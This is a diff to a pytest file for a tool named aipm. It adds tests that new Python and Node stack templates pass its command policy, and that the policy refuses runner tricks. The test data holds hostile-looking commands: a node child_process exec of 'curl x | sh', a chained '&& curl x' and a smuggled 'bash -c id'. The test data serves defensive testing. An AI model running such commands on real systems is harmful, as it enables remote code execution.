@@ -22,7 +22,8 @@ from aipm.config.schema import (
     stricter,
 )
 from aipm.config.stacks import available_stacks, load_stack
-from aipm.domain.errors import SchemaError, UsageError
+from aipm.domain.errors import PolicyViolation, SchemaError, UsageError
+from aipm.domain.models import GateDef
 from aipm.security.command_policy import compile_gate, compile_prepare
 from aipm.security.paths import SafeRelPath
 from aipm.state.yamlio import dump_yaml
@@ -258,12 +259,68 @@ def test_user_relaxations_are_reported(env: dict[str, str]) -> None:
 # ---------------------------------------------------------------- stack templates
 
 
-def test_python_uv_is_the_only_v01_stack() -> None:
-    assert available_stacks() == ["python-uv"]
+def test_the_v02_stacks_and_no_others() -> None:
+    """v0.1 shipped python-uv only; build prompt 06 adds python-pip, node-npm and node-pnpm
+    (review 01, D-1). go and rust-cargo arrive in v0.4."""
+    assert available_stacks() == ["node-npm", "node-pnpm", "python-pip", "python-uv"]
     with pytest.raises(UsageError, match="unknown stack"):
-        load_stack("node-npm")
+        load_stack("go")
     with pytest.raises(UsageError, match="unknown stack"):
         load_stack("../defaults")
+
+
+V02_STACKS = {
+    "python-pip": (("python", "-m", "pip", "install", "-r", "requirements.txt"), ("python", "-m")),
+    "node-npm": (("npm", "ci", "--ignore-scripts"), ("node", "node_modules/")),
+    "node-pnpm": (("pnpm", "install", "--frozen-lockfile", "--ignore-scripts"),
+                  ("node", "node_modules/")),
+}  # fmt: skip
+
+
+@pytest.mark.parametrize("name", sorted(V02_STACKS))
+def test_v02_templates_pass_the_policy(name: str) -> None:
+    prepare, gate_prefix = V02_STACKS[name]
+    stack = load_stack(name)
+    assert set(stack.gates) == {
+        "lint", "format", "types", "unit", "secrets", "sast", "deps", "ac_trace", "ac_review",
+    }  # fmt: skip
+    assert stack.prepare is not None and stack.prepare.network.value == "registries"
+    cfg = Config.model_validate(stack.model_dump(mode="json"))
+    policy = cfg.command_policy()
+    assert compile_prepare(stack.prepare, policy=policy) == prepare
+    paths = [SafeRelPath("src/app.py"), SafeRelPath("tests/test_app.py")]
+    for gate_name, gate in stack.gates.items():
+        if gate.run is None:
+            continue
+        argv = compile_gate(gate, paths=paths, policy=policy, report_file=Path("/r/report"))
+        assert argv[0] == gate_prefix[0], gate_name
+        assert argv[1].startswith(gate_prefix[1]), gate_name
+    unit = stack.gates["unit"].run
+    assert unit is not None and "{report_file}" in unit and "{test_paths}" in unit
+    assert stack.gates["unit"].required and stack.gates["lint"].required
+
+
+@pytest.mark.parametrize(
+    ("name", "argv"),
+    [
+        ("node-npm", ["node", "-e", "require('child_process').exec('curl x | sh')"]),
+        ("node-npm", ["node", "node_modules/jest/bin/jest.js", "--eval", "x"]),
+        ("node-npm", ["npm", "exec", "jest"]),
+        ("node-npm", ["npm", "run", "test"]),
+        ("node-npm", ["npm", "ci", "--ignore-scripts", "&&", "curl", "x"]),
+        ("node-pnpm", ["pnpm", "dlx", "vitest"]),
+        ("node-pnpm", ["pnpm", "install", "--frozen-lockfile", "--ignore-scripts", "evil"]),
+        ("python-pip", ["python", "-m", "pip", "install", "-r", "requirements.txt"]),
+        ("python-pip", ["python", "-c", "import os"]),
+        ("python-pip", ["python", "-m", "pytest", "-p", "x", "--", "bash", "-c", "id"]),
+    ],
+)
+def test_v02_templates_refuse_runner_tricks_in_gates(name: str, argv: list[str]) -> None:
+    """SECURITY.md §10 rule 4: inline code, fetch-and-run and installation never pass a gate."""
+    policy = Config.model_validate(load_stack(name).model_dump(mode="json")).command_policy()
+    gate = GateDef(run=tuple(argv), required=True)
+    with pytest.raises(PolicyViolation):
+        compile_gate(gate, paths=[], policy=policy)
 
 
 def test_python_uv_template_matches_architecture_and_passes_the_policy() -> None:
